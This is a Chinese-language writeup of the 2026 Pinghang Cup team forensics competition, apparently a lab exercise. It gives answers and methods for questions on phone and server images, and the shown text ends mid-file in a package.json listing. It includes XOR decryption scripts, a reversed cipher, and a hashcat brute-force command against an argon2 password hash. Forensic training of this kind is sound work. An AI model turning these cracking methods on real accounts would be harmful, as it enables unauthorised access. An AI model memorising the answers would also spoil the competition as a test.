---
title: "2026 - Group"
pubDate: 2026-06-04
tags: ["pinghang-cup", "2026", "group", "writeup", "dfir"]
status: "published"
---
 - 2026.04.11 start

 - 2026.06.04 finish

## 检材密码
R4f34s1XoPz34wrV

全部题目 pdf文件📎平航杯团体赛题目文件.pdf
## 手机
### 1 # 分析早起王的手机，手机型号为?【答案格式：Xiaomi13】
#### 答案
Pixel 6

#### 过程
在检材的镜像文件边上


<img src="/Picture/WpDF/Pinghang/2026Group/1.png" width="662" title="" crop="0,0,1,1" id="u13e17362" class="ne-image">

这是个json文件（进去看看格式就能猜出来），里面有一个键值对就是xinxi


<img src="/Picture/WpDF/Pinghang/2026Group/2.png" width="887.5" title="" crop="0,0,1,1" id="u09eb2e11" class="ne-image">

### 2 分析早起王的手机，早起王最近想旅行，结合高德地图搜索记录，他最可能去的景点是哪个【答案格式：黄山】
#### 答案
西湖

#### 过程
火眼直接看


<img src="/Picture/WpDF/Pinghang/2026Group/3.png" width="1439.5" title="" crop="0,0,1,1" id="udf1d4fed" class="ne-image">

### 3 分析早起王的手机，早起王在什么时间加上倩倩微信的?【答案格式：2025-08-18 07:09:19】
#### 答案
2026-03-30 15:13:08

#### 过程
火眼直接看

看名字都能猜出来哪位是倩倩


<img src="/Picture/WpDF/Pinghang/2026Group/4.png" width="1439.5" title="" crop="0,0,1,1" id="u1c0a512c" class="ne-image">

### 4 分析早起王的手机，倩倩在2026年3月30号吃了什么?【答案格式：西湖醋鱼】
#### 答案
麻薯小蛋糕

#### 过程
依旧火眼

既然是找早起王手机，这家伙手机里面没多少东西，倩倩又不可能给他发，那很可能是倩倩群发的消息，猜测在朋友圈

还真是


<img src="/Picture/WpDF/Pinghang/2026Group/5.png" width="1439.5" title="" crop="0,0,1,1" id="u719a360e" class="ne-image">

看的我好尬（）
### 5 # 分析倩倩的手机，倩倩手机的系统版本是多少?【答案格式：5.2.3.123】
#### 答案
6.0.0.380

#### 过程
神秘火眼什么也看不到

直接去文件里面找备份信息

里面有一个键值对就是版本


<img src="/Picture/WpDF/Pinghang/2026Group/6.png" width="1439.5" title="" crop="0,0,1,1" id="u7acd0b6c" class="ne-image">

### 6 分析倩倩的手机，“舔狗”的微信内部ID是多少?【答案格式： wxid_ab12】
#### 答案
wxid_uh5tfx2zi8yh22

#### 过程
火眼通讯录


<img src="/Picture/WpDF/Pinghang/2026Group/7.png" width="1439.5" title="" crop="0,0,1,1" id="ue709db2b" class="ne-image">

### 7 分析倩倩的手机，倩倩曾给一位好友推荐游戏，这个好友叫什么名字?【答案格式：杨梅】
#### 答案
冰糖

#### 过程
怪不得格式是杨梅（）

不在微信在便签里面，不过挺好找的

微信消息就那几条，翻完了也没找到，只能去其他地方看看

短信也没有，小红书也没有，只有便签了


<img src="/Picture/WpDF/Pinghang/2026Group/8.png" width="1439.5" title="" crop="0,0,1,1" id="u9f3a75e1" class="ne-image">

### 8 分析倩倩的手机结合逆向包，推荐的游戏叫什么?【答案格式： far echo】
#### 答案
zero sievert

#### 过程
既然告诉我们是图片，那去逆向里面找图片就好了

一开始能找到文件，但是完全打不开


<img src="/Picture/WpDF/Pinghang/2026Group/9.png" width="954" title="" crop="0,0,1,1" id="u96cd7cb9" class="ne-image">

说句实话要不是文件不多，我第一次真没注意到这俩是图片
完全打不开的


去15、16、17浏览该文件全部解密过程（所以你为什么放第8题？？）

### 9 分析倩倩的手机，倩宿一共阅读过多少条搜孤新闻?【答案格式：11】
#### 答案
33

#### 过程
在火眼里面找不到搜狐（垃圾东西，一到鸿蒙就啥也搜不出来（恼））

找读过几条肯定是去找数据库，那么首先去找火狐的包

具体路径在这里

/com.sohu.harmonynews/com.sohu.harmonynews/data/storage/el2/database/entry/kvdb/2c77515efb1c9f5f9b5fdc9d2f78edae26e57c53dd63b19a9b0728f71f2aa42f/single_ver/main

去浏览应用，看到sohu、news就知道这是搜狐新闻的，

到storage文件夹的时候会发现el1是空的，只能去找el2，el2那肯定是往database里去找，然后里面总共就那么几个文件，很快就能找到数据库

里面有35条，但是前两条似乎并不是文章


<img src="/Picture/WpDF/Pinghang/2026Group/10.png" width="1439.5" title="" crop="0,0,1,1" id="u19e81ea0" class="ne-image">

### 10 分析倩倩手机逆向包，数据加密app的包名是什么?【答案格式： com.komeiji.satori】
#### 答案
com.koishi.fpt

#### 过程
整个逆向就一个包，你说呢（）


<img src="/Picture/WpDF/Pinghang/2026Group/11.png" width="674.5" title="" crop="0,0,1,1" id="uc3581cc8" class="ne-image">

事实上去app里面看也是一样的。由于.app格式事实上就是一个文件夹，或者说zip文件，直接用解压软件就能解开了


<img src="/Picture/WpDF/Pinghang/2026Group/12.png" width="1213.5" title="" crop="0,0,1,1" id="u462d96fe" class="ne-image">

呐~标志性头文件
然后打开看里面的info也是这个包名


<img src="/Picture/WpDF/Pinghang/2026Group/13.png" width="1439.5" title="" crop="0,0,1,1" id="ue79919d9" class="ne-image">

### 11 接上题，初始化app时需要至少几位数的密码?【答案格式：10】
#### 答案
6

#### 过程
用abc-decompiler打开modules.abc文件（abc是鸿蒙整出来的神秘文件格式）

这个文件位置（应该是）固定的，在.hap文件里面（直接解压就行），ets文件夹中


<img src="/Picture/WpDF/Pinghang/2026Group/14.png" width="1439.5" title="" crop="0,0,1,1" id="u53cb7c9a" class="ne-image">

有一说一，反编译的这个函数名为什么前面会有一堆#（？）

### 12 接上题，加密后的文件名的后缀是什么?【答案格式： .enc】
#### 答案
.tb

#### 过程
在FileList那里有一个函数，会把.tb这个字符给抹除

再加上，第8题，有俩图片打不开，这俩后缀刚好也是.tb

猜测解密过程应该也在这里，并且确认了加密后缀应该就是.tb


<img src="/Picture/WpDF/Pinghang/2026Group/15.png" width="1439.5" title="" crop="0,0,1,1" id="u234cf9d7" class="ne-image">

### 13 接上题， app会自动识别几种后缀的文件为图片类型?【答案格式：8】
#### 答案
5

#### 过程
这个真是接上题


<img src="/Picture/WpDF/Pinghang/2026Group/16.png" width="1439.5" title="" crop="0,0,1,1" id="u4097162c" class="ne-image">

### 14 接上题， app共从用于自定义加密的so模块导入了几个方法?【答案格式：8】
#### 答案
2

#### 过程
那要看怎么找这个“导入”

根据网页上的说法，导入的方式是一个import指令

https://bbs.kanxue.com/thread-283225-1.htm当然也能看这个，记得转换成zip

<img src="/Picture/WpDF/Pinghang/2026Group/17.png" width="1439.5" title="" crop="0,0,1,1" id="u6c7d9a61" class="ne-image">

那就简单了，直接暴力搜索import就行

一共就2个


<img src="/Picture/WpDF/Pinghang/2026Group/18.png" width="1002.5" title="" crop="0,0,1,1" id="u4f31a9bb" class="ne-image">

### 15 接上题， app设置的密码是多少?【答案格式：514aalla4191a98】
#### 答案
217cb94a01679e39

#### 过程
很容易能想到，密码这种东西肯定是保存在配置文件里面的，不管是加密前的还是加密后的

那对于这俩文件，很明显上面是用户数据存储的地方（毕竟第8题图片就存在那里），下面是应用本身


<img src="/Picture/WpDF/Pinghang/2026Group/19.png" width="403" title="" crop="0,0,1,1" id="u6f0b9345" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/20.png" width="866" title="" crop="0,0,1,1" id="u1b5166c1" class="ne-image">

去文件夹里找（反正也不大）

A:\1-手机\倩倩手机逆向包\com.koishi.fpt\haps\entry\preferences

这个文件夹下面就是密码

俩文件，这道题要的文件是vault_prefs（毕竟后一个0kb）

文件内容&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;preferences version=&quot;1.0&quot;&gt;&lt;string key=&quot;orig_path_139346145_p0.png.tb&quot;&gt;file://docs/storage/Users/currentUser/Download/139346145_p0.png&lt;/string&gt;&lt;string key=&quot;orig_path_Snipaste_2026-04-03_10-56-53.jpg.tb&quot;&gt;file://docs/storage/Users/currentUser/Download/Snipaste_2026-04-03_10-56-53.jpg&lt;/string&gt;&lt;string key=&quot;password_hash&quot;&gt;217sr94q01679u39&lt;/string&gt;&lt;string key=&quot;salt&quot;&gt;yqWpy+rJX82gRZuCjoB16w==&lt;/string&gt;&lt;/preferences&gt;
里面提到的password（217sr94q01679u39）是hash值，那就可以确认肯定是加密过的，回去找怎么加密的

（这里我也看不懂（）根据平航杯自己的wp，这里是回去用ida反编译了）

所以这里先去软件里面找库（根据前面依赖项的名字lib......，推测这是个库文件）

A:\1-手机\倩倩手机逆向包\fpt-default-signed - 副本\entry-default\libs\arm64-v8a

去逆向libcrypto.so看看是怎么加密的

这里搜索crypto（so文件名称），目的是定位到具体函数，因为要看加密逻辑是什么


<img src="/Picture/WpDF/Pinghang/2026Group/21.png" width="1439.5" title="" crop="0,0,1,1" id="u83e42ae2" class="ne-image">

双击进入函数查看逻辑

这里能发现这个函数里面包含了两个函数

根据

LDP             Q0, Q1, [X9,#(off_D930 - 0xD8F0)] ; "xorEncrypt"

得知此字符串地址是D930，由于一个函数名称的字符串存储位置是第一个8字节，函数指针在第三个8字节，所以去D940找函数

同理，去D900找rot13


<img src="/Picture/WpDF/Pinghang/2026Group/22.png" width="882" title="" crop="0,0,1,1" id="ue50d3278" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/23.png" width="1439.5" title="" crop="0,0,1,1" id="uaf564998" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/24.png" width="1439.5" title="" crop="0,0,1,1" id="u577515fd" class="ne-image">

然后这里（理论上）能从前端（？）（就是modules.abc）看出来密码是通过rot13加密的

（）

忽略掉一长串的定义后看逻辑部分代码


<img src="/Picture/WpDF/Pinghang/2026Group/25.png" width="1439.5" title="" crop="0,0,1,1" id="ub7c80d3a" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/26.png" width="1439.5" title="" crop="0,0,1,1" id="uf89057fb" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/27.png" width="1439.5" title="" crop="0,0,1,1" id="u49a073e2" class="ne-image">

从这里能（？）推断出加密方式逻辑是rot13，但是偏移量其实是16而非13

这里可以看出来，

对于小写字母（v14-97 < 26(0x1A)），将（v14 - 81）% 26 + 97，这里81本质上是 - 97 + 16（97在ASCII是a），偏移了16

对于大写字母（这里是将这些v14-65 > 25(0x19)的排除了），将（v14 - 49）% 26 + 65，49对应的是-65 + 16，也是偏移16

所以这实际上是偏移了16的rot13（鉴定为纯粹的诈骗）


<img src="/Picture/WpDF/Pinghang/2026Group/28.png" width="505" title="" crop="0,0,1,1" id="ued1f5067" class="ne-image">

那既然如此，用rot16把前面那串密码解出来即可

对了，记得解密是-16


<img src="/Picture/WpDF/Pinghang/2026Group/29.png" width="1439.5" title="" crop="0,0,1,1" id="u97478bad" class="ne-image">

### 16 接上题， app中存储的门锁密码是多少?【答案格式：5141141919810】
#### 答案
1472580369123

#### 过程
第12题曾问过加密文件的后缀是什么（.tb），

在files文件夹下面的notes和vault文件夹下面都能看到加密文件


<img src="/Picture/WpDF/Pinghang/2026Group/30.png" width="864" title="" crop="0,0,1,1" id="ud05e1d42" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/31.png" width="882" title="" crop="0,0,1,1" id="u85275748" class="ne-image">

而与此对应的，在Dashboard这个文件下面也能看到两种加密对象，一个是笔记一个是文件

前一个跳转到noteslist的生命周期函数，后一个跳转到filelist


<img src="/Picture/WpDF/Pinghang/2026Group/32.png" width="1439.5" title="" crop="0,0,1,1" id="u97142cd4" class="ne-image">

下一题是问图片加密是什么，推测此题答案在notes里



查看noteslist的主函数（func_main_0）


<img src="/Picture/WpDF/Pinghang/2026Group/33.png" width="1154.5" title="" crop="0,0,1,1" id="udc4da4c2" class="ne-image">

第一个obj在注册这个类中存在什么东西

后面obj2["notes"].getter = obj2.#~i5>#notes;  这种，是在说读取到何种状态（比方说这里就是读取笔记的时候）

再后面obj2.aboutToAppear  = obj2.#~i5>#aboutToAppear; 这种是把对应的函数和生命周期绑定

因此这里是优先调用aboutToAppear，再调用loadNotes

在aboutToAppear里面，这就在检测密码是否存在，若存在直接调用loadNotes


<img src="/Picture/WpDF/Pinghang/2026Group/34.png" width="1171" title="" crop="0,0.1272,1,1" id="ue0c559cf" class="ne-image">

ds的翻译
async aboutToAppear() {
    // 1. 从全局存储中读取“用户密码”（可能是明文或某些标识）
    let password = AppStorage.get(&quot;userPassword&quot;) ?? &quot;&quot;;
    this.userPassword = password;

    // 2. 如果密码为空（未登录/未验证）
    if (!this.userPassword) {
        // 跳转到认证页面，强迫用户输入密码
        router.replaceUrl({ url: &quot;pages/AuthPage&quot; });
        return;
    }

    // 3. 密码存在，直接加载并解密笔记列表
    await this.loadNotes();
}
然后去看loadNotes


<img src="/Picture/WpDF/Pinghang/2026Group/35.png" width="1221" title="" crop="0,0,1,1" id="ua1514e41" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/36.png" width="1222" title="" crop="0,0,1,1" id="ufc4b4982" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/37.png" width="1221.5" title="" crop="0,0,1,1" id="u9fdd7dd6" class="ne-image">

ds的翻译
async loadNotes() {
    // 1. 开始加载，显示加载动画
    this.isLoading = true;

    // 2. 获取应用上下文
    const context = getContext(this);

    // 3. 从 a/b 模块获取“保险箱”对象 t（可能是一个存储容器或数据库实例）
    const i = await import(&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/a/b&amp;&quot;);
    const t = i.t(context);          // 初始化存储
    await i.o(t);                    // 可能的打开/准备操作

    // 4. 从 a/c 模块获取密码哈希
    const a1 = await import(&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/a/c&amp;&quot;);
    const passwordHash = await a1.getInstance().get(&quot;password_hash&quot;);

    // 5. 拿到所有笔记的 ID 列表（resumegenerator 是 ID 数组的迭代器）
    const noteIds = await ...;       // 对应代码中 throw(obj12) 之后那段迭代器处理

    const notesArray = [];

    // 6. 遍历每个笔记 ID，分别读取并解密
    for (const noteId of noteIds) {
        try {
            // 6.1 从存储中读取加密的笔记数据（路径类似 &quot;0/12345&quot;）
            const encryptedData = await i.m(t + &quot;/&quot; + noteId);

            // 6.2 使用 a/d 模块解密
            const e1 = await import(&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/a/d&amp;&quot;);
            const step1 = e1.b2(encryptedData, passwordHash);  // 第一步处理（可能是密钥派生+解密）
            const plainJson = e1.u1(step1);                     // 第二步处理（转换成明文字符串）

            // 6.3 解析 JSON 并加入列表
            notesArray.push(JSON.parse(plainJson));
        } catch (e) {
            // 某条笔记解密失败，跳过，继续处理下一条
            continue;
        }
    }

    // 7. 按某种规则排序（#~i5&gt;@0*# 是一个比较函数，根据 f5 字段排序）
    this.notes = notesArray.sort((a, b) =&gt; b.f5 - a.f5);
    
    // 8. 加载完成，隐藏加载动画
    this.isLoading = false;
}
可以看出来，解密部分用的是ets/a/d里面的东西，结合前面调用libencrypt.so库那道题，调用该库的就是a/d

此时去a/d里查看


<img src="/Picture/WpDF/Pinghang/2026Group/38.png" width="1182" title="" crop="0,0,1,1" id="u53538bce" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/39.png" width="1255.5" title="" crop="0,0,1,1" id="u9e3fac90" class="ne-image">

不难发现，b2实际上就是s1（啥也没干就引用了s1），而且这时候也能发现a2也调用了s1，推测a2就是加密（因为格式完全一致，b2是解密那a2很可能是加密），因此这里用的是对称加密（流密码）来加密笔记的（加解密用同一个函数）

在libcrypto.so里面有两个函数，一个是rot13一个是xorencrypt，已经能合理推测这里是xorencrypt了

（具体逻辑并不是很清楚，因为s1和so库里面的函数名称指向并没有很搞清楚）

在ida里反编译出来的这个sub_5D58，意义是将俩函数存到napi表里面，而且只存了这俩函数（具体汇编看不大懂，问AI即可（））


<img src="/Picture/WpDF/Pinghang/2026Group/40.png" width="1164" title="" crop="0,0,1,1" id="ud4bbf26d" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/41.png" width="1049.5" title="" crop="0,0,1,1" id="u474d12ba" class="ne-image">

ds老师的解释

sub_5D58 一看就是NAPI 模块的注册入口，因为它身上有非常典型的“注册函数表”特征。我们从外到内把证据拆开看：① 函数签名和返回值 —— 符合 NAPI 注册函数模板MOV    X19, X1          ; 把第二个参数（exports 对象）暂存到 X19
...
MOV    X0, X19          ; 函数返回前，把 exports 对象放入 X0
RETNAPI 模块初始化函数的 C 原型是：
napi_value Init(napi_env env, napi_value exports);它接收 env 和 exports，最后必须返回 exports。
这里 X0 存 env，X1 存 exports，函数末尾 MOV X0, X19 然后返回，行为完全吻合。② 直接调用了 napi_define_properties.text:5DAC   BL   .napi_define_properties这是 NAPI 中专门用来批量注册属性/方法的函数。只有模块初始化时需要这样做，把 native 函数挂到 exports 对象上供 ArkTS 调用。③ 调用前准备了“属性描述数组”在调用 napi_define_properties 之前，函数从 .data.rel.ro 段加载了两组数据到栈上：
ADRP   X9, #off_D8F0@PAGE
LDP    Q0, Q1, [X9]             ; &quot;rot13&quot;
LDP    Q2, Q3, [X9,#(xmmword_D910 - 0xD8F0)]
STP    Q0, Q1, [SP,#0xB0+var_B0] ; 存到栈
STP    Q2, Q3, [SP,#0xB0+var_90]

LDP    Q0, Q1, [X9,#(off_D930 - 0xD8F0)] ; &quot;xorEncrypt&quot; + 函数指针
LDP    Q2, Q3, [X9,#(xmmword_D950 - 0xD8F0)]
...
STP    Q0, Q1, [SP,#0xB0+var_70]
STP    Q2, Q3, [SP,#0xB0+var_50]每组数据正好是一个 napi_property_descriptor 结构，包含：属性名字符串（如 &quot;rot13&quot;、&quot;xorEncrypt&quot;）函数指针（如 sub_5DE0、sub_603C）你把 .data.rel.ro 里的内容对照一看：
off_D8F0   DCQ &quot;rot13&quot;
off_D8F8   ...函数指针...(对应 sub_5DE0)
off_D930   DCQ &quot;xorEncrypt&quot;
off_D940   DCQ sub_603C这等于明说：“我要把 sub_603C 以名字 xorEncrypt 注册到 JS 对象上”。④ 参数配置 —— 指定数组长度MOV    W2, #2              ; 第三个参数 = 2
MOV    X3, SP              ; 第四个参数 = 栈上准备好的数组地址
BL     .napi_define_propertiesnapi_define_properties(env, exports, 2, &amp; properties_array)
这个 2 就是注册了两个方法：rot13 和 xorEncrypt。⑤ 栈保护 canary —— 标志这是一个完整的“正规”导出函数ADRP   X8, #__stack_chk_guard_ptr@PAGE
LDR    X8, [X8]
STUR   X8, [X29, #var_28]
...
BL     .__stack_chk_fail   ; 检查失败就会跳过来带有栈保护的函数通常是模块主入口，因为它是外部直接调用的边界函数，需要防溢出。总结成一幅图sub_5D58 (模块初始化)
  │
  ├─ 接收 env + exports
  ├─ 在栈上组装属性描述数组 [ {name:&quot;rot13&quot;, fn: sub_5DE0},
  │                              {name:&quot;xorEncrypt&quot;, fn: sub_603C} ]
  ├─ 调用 napi_define_properties(env, exports, 2, 栈数组)
  └─ 返回 exports所以不需要看内部逻辑，光是调用了 napi_define_properties 且前后出现字符串 + 函数地址的加载，就可以 100% 断定这是一个注册函数表的入口。再加上前面返回 exports 的行为，它正是 libcrypto.so 暴露给 ArkTS 的所有 native 函数的“出生登记处”。
然后，这俩函数，rot13在前一题展示过，该函数只传一个参数，不符合s1读取俩参数的行为


<img src="/Picture/WpDF/Pinghang/2026Group/42.png" width="842.5" title="" crop="0,0,1,1" id="u48d6a52a" class="ne-image">

这里基本可以完全断定xor就是s1（虽然这中间具体逻辑依旧找不到，就是说为什么这里是从注册表里读的是s1而那里注册的是xorEncrypt，这俩名字找不到对应）



现在知道加密用的是xorEncrypt，可以细看逻辑了

找到xor这个函数逻辑和找rot13一样了，定位到D930的位置，这是函数名的字符串的位置，加两个8字节定位到D940就是函数指针位置，得知是sub_603C，确认xor就是sub_603C

这一段重点在于加密逻辑（虽然我是让AI分析的（））

v10[v21] = (v22[v21 % v19] + v21 % v19) ^ v6[v21];

Trae的翻译：

output[i] = (key[i % key_len] + (i % key_len)) XOR input[i]


<img src="/Picture/WpDF/Pinghang/2026Group/43.png" width="829.5" title="" crop="0,0,1,1" id="uc325cfa0" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/44.png" width="990.5" title="" crop="0,0,1,1" id="ubdeb2c85" class="ne-image">

这里的key在modules.abc里面很明显，就是前一题的password_hash


<img src="/Picture/WpDF/Pinghang/2026Group/45.png" width="1243" title="" crop="0,0,1,1" id="u53fc0720" class="ne-image">

鉴于xor出的密文再xor一次就能复原，直接把这段加密代码复制过去就能用了

于是得到以下代码

```python
import os;

myPath = os.path.dirname(os.path.abspath(__file__));
fileName = "b88c3348-9389-4fad-8cd6-3490e6bbdd26.json.tb";
filePath = os.path.join(myPath, fileName);

newPath = os.path.join(myPath, "plain.json");

plain = [];
key = "217sr94q01679u39";

with open(filePath, "rb") as c:
    cipher = c.read();

for i in range(0, len(cipher)):
    # output[i] = (key[i % key_len] + (i % key_len)) XOR input[i]
    plain.append((ord(key[i % len(key)]) + (i % len(key))) ^ cipher[i]);

with open(newPath, "wb") as p:
    p.write(bytes(plain));

print(f"文件成功保存在:{newPath}");
```

然后输出的json文件：

```json
{
  "id": "b88c3348-9389-4fad-8cd6-3490e6bbdd26",
  "title": "门锁密码",
  "content": "1472580369123",
  "updatedAt": 1775196161152
}
```

（孩子们这题对我来说太困难了）

### 17 接上题，加密图片里面的隐藏的flag是多少?【答案格式： flag(123456!}】
#### 答案
flag{happy_forensics_2026!}

#### 过程
解密过程与上文基本一致

甚至加解密逻辑都一样

代码直接沿用即可（）

```python
import os;

myPath = os.path.dirname(os.path.abspath(__file__));
fileName = "Snipaste_2026-04-03_10-56-53.jpg.tb";
filePath = os.path.join(myPath, fileName);

newName = fileName.removesuffix(".tb");
newPath = os.path.join(myPath, newName);

plain = [];
key = "217sr94q01679u39";

with open(filePath, "rb") as c:
    cipher = c.read();

for i in range(0, len(cipher)):
    # output[i] = (key[i % key_len] + (i % key_len)) XOR input[i]
    plain.append((ord(key[i % len(key)]) + (i % len(key))) ^ cipher[i]);

with open(newPath, "wb") as p:
    p.write(bytes(plain));

print(f"文件成功保存在:{newPath}");
```

就这样把俩文件都解出来


<img src="/Picture/WpDF/Pinghang/2026Group/46.jpg" width="454" title="" crop="0,0,1,1" id="ud147327d" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/47.png" width="3200" title="" crop="0,0,1,1" id="u8b69017f" class="ne-image">

666flag藏第二张图片16进制尾


<img src="/Picture/WpDF/Pinghang/2026Group/48.png" width="1439.5" title="" crop="0,0,1,1" id="u12d2f056" class="ne-image">

到这里，第8题也一并做出来了（那你放第8题干啥？？）

## 服务器
### 18 # 分析服务器镜像，内核版本为?【答案格式：5.10-301-generic】
#### 答案
6.8.0-107-generic

#### 过程
直接在火眼看


<img src="/Picture/WpDF/Pinghang/2026Group/49.png" width="1295.5" title="" crop="0,0,1,1" id="u2287cf5a" class="ne-image">

### 19 分析服务器镜像，用户登录成功系统的次数为?【答案格式：3】
#### 答案
10

#### 过程
火眼看到后跳转到源文件导出，会发现这是一个叫wtmp的文件

先将文件拷贝到wsl下面，用wsl运行命令

last -f ~/wtmp


<img src="/Picture/WpDF/Pinghang/2026Group/50.png" width="766" title="" crop="0,0,1,1" id="u195950f4" class="ne-image">



值得一提的是，火眼似乎又不大正确（恼）

（我再也不相信火眼了）


<img src="/Picture/WpDF/Pinghang/2026Group/51.png" width="1377.5" title="" crop="0,0,1,1" id="ua6b05e77" class="ne-image">

### 20 分析服务器镜像，redis数据库服务密码是多少?【答案格式：abedef】
#### 答案
zjjcxy

#### 过程
具体路径在

ubuntu-vg(yQKxyl-n4VL-YA9k-c2Po-rOKS-7MHk-yCHSAk)/分区0/etc/redis

下面（具体来说，redis数据库密码都存在/etc/redis下面的）

里面有个文件叫redis.conf

导出后在文件中搜索requirepass，后面跟的就是密码


<img src="/Picture/WpDF/Pinghang/2026Group/52.png" width="1439.5" title="" crop="0,0,1,1" id="u8e11aa57" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/53.png" width="989" title="" crop="0,0,1,1" id="u2be3598e" class="ne-image">

### 21 分析服务器镜像，api站点后台管理员密码所用的加密算法为?【答案格式：berypt】
#### 答案
#### 过程
先连接到finalshell上面

参考文献https://blog.csdn.net/cygqtt/article/details/127105160换zip
📎安装finalshell 高级版（绿色版）_finalshell 绿色-CSDN博客_files.txt
先设置VM的NAT模式

编辑 -> 虚拟网络编辑器 -> 更改设置


<img src="/Picture/WpDF/Pinghang/2026Group/54.png" width="620" title="" crop="0,0,1,1" id="ubc8de3ea" class="ne-image">

切换到VMnet8，给一个子网网络地址

然后到DHCP设置里面设置子网主机范围

到NAT设置里面把网关的网络位改成子网范围内的


<img src="/Picture/WpDF/Pinghang/2026Group/55.png" width="603.5" title="" crop="0,0,1,1" id="u2498616f" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/56.png" width="597" title="" crop="0,0,1,1" id="u5f02bff8" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/57.png" width="626.5" title="" crop="0,0,1,1" id="u61b14e2e" class="ne-image">

此刻新建虚拟机，在高级设置里面把网络改正NAT模式


<img src="/Picture/WpDF/Pinghang/2026Group/58.png" width="1319" title="" crop="0,0,1,1" id="U6p1a" class="ne-image">

登录的用户名就是zaoqiwang，密码重置为123456了


<img src="/Picture/WpDF/Pinghang/2026Group/59.png" width="741" title="" crop="0,0,1,1" id="XMknc" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/60.png" width="1155.5" title="" crop="0,0,1,1" id="V7AhR" class="ne-image">

然后查看ip地址

```bash
ip addr
```


<img src="/Picture/WpDF/Pinghang/2026Group/61.png" width="842.5" title="" crop="0,0,1,1" id="uabbdbac5" class="ne-image">

这里能看到ip是169.254.54.4，可以用命令行ping一下看看能不能连上，能联上就能用finalshell


<img src="/Picture/WpDF/Pinghang/2026Group/62.png" width="596" title="" crop="0,0,1,1" id="u4e1d454a" class="ne-image">

ping不上先ping一下百度看看是不是主机问题
ping www.baidu.com


打开finalshell，用ssh连接


<img src="/Picture/WpDF/Pinghang/2026Group/63.png" width="1293.5" title="" crop="0,0,1,1" id="ub01d6f33" class="ne-image">

设置SSH连接

名称随意取，主机就是虚拟机的IP地址，前面ip addr过了

用户名就是主机名，密码就是重置过的123456

确定


<img src="/Picture/WpDF/Pinghang/2026Group/64.png" width="1091" title="" crop="0,0,1,1" id="u9bac1a3a" class="ne-image">

接受并保存


<img src="/Picture/WpDF/Pinghang/2026Group/65.png" width="1319" title="" crop="0,0,1,1" id="u75b855a9" class="ne-image">

然后就能连上了，文件系统就在下方


<img src="/Picture/WpDF/Pinghang/2026Group/66.png" width="1440" title="" crop="0,0,1,1" id="u6c1f4ff0" class="ne-image">



在home里能看到一个文件夹，这个文件夹就是api

在该文件夹下的/data/init.json就是配置文件


<img src="/Picture/WpDF/Pinghang/2026Group/67.png" width="1439.5" title="" crop="0,0,1,1" id="uc862edd6" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/68.png" width="1015" title="" crop="0,0,1,1" id="u926fa4a6" class="ne-image">

打开后看到，加密方式是argon2


<img src="/Picture/WpDF/Pinghang/2026Group/69.png" width="807" title="" crop="0,0,1,1" id="uf68fb321" class="ne-image">

### 22 分析服务器镜像， api站点后台管理员密码为(使用rockyou字典爆破，密码格式b1?????b,?为数字)?【答案格式： a123456a】
#### 答案
b123321b

#### 过程
密码的哈希已经知道了

直接用hashcat爆破即可

Hashcat不支持环境变量！！！！！记得在Hashcat路径下面cmd！！！！

```bash
hashcat.exe -m 34000 -a 3 "$argon2id$v=19$m=65536,t=3,p=1$k2++JvGxHI8i9DzqRXJx9A$jNviq0EPqLkMfIZZsA9RC6M9mClaXDxkSwCWYVZNx/Q" b1?d?d?d?d?db --status --status-timer 10
```

hashcat命令解释

然后就能爆破出来了

我这个垃圾电脑也能12分钟爆破出来，甚至字典根本没用上

Hashcat神力

### 23 分析服务器镜像，登录api网站后台，后台通知设置里的超时事件(毫秒)为?【答案格式：10000】
#### 答案
114514

#### 过程
注意到在上上题标注出来的文件夹下面有这样一个文件夹


<img src="/Picture/WpDF/Pinghang/2026Group/70.png" width="1140" title="" crop="0,0,1,1" id="u7788235a" class="ne-image">

合理推测这是个nodejs的项目

然后又不难注意到有package.json

打开后会发现

```json
{
  "name": "claude-relay-service",
  "version": "1.0.0",
  "description": "Claude Code API relay service with multi-account management, OpenAI compatibility, and API key authentication",
  "main": "src/app.js",
  "scripts": {
    "start": "npm run lint && node src/app.js",
    "dev": "nodemon",
    "build:web": "cd web/admin-spa && npm run build",
    "install:web": "cd web/admin-spa && npm install",
    "update:pricing": "node scripts/update-model-pricing.js",
    "setup": "node scripts/setup.js",
    "cli": "node cli/index.js",
    "init:costs": "node src/cli/initCosts.js",
    "service": "node scripts/manage.js",
    "service:start": "node scripts/manage.js start",
    "service:start:daemon": "node scripts/manage.js start -d",
    "service:start:d": "node scripts/manage.js start -d",
    "service:daemon": "node scripts/manage.js start -d",
    "service:stop": "node scripts/manage.js stop",
    "service:restart": "node scripts/manage.js restart",
    "service:restart:daemon": "node scripts/manage.js restart -d",
    "service:logs:follow": "node scripts/manage.js logs -f",
    "service:restart:d": "node scripts/manage.js restart -d",
    "service:status": "node scripts/manage.js status",
    "service:logs": "node scripts/manage.js logs",
    "monitor": "bash scripts/monitor-enhanced.sh",
    "status": "bash scripts/status-unified.sh",
    "status:detail": "bash scripts/status-unified.sh --detail",
    "test": "jest",
    "lint": "eslint src/**/*.js cli/**/*.js scripts/**/*.js --fix",
    "lint:check": "eslint src/**/*.js cli/**/*.js scripts/**/*.js",
    "format": "prettier --write \"src/**/*.js\" \"cli/**/*.js\" \"scripts/**/*.js\"",
    "format:check": "prettier --check \"src/**/*.js\" \"cli/**/*.js\" \"scripts/**/*.js\"",
    "docker:build": "docker build -t claude-relay-service .",
    "docker:up": "docker-compose up -d",
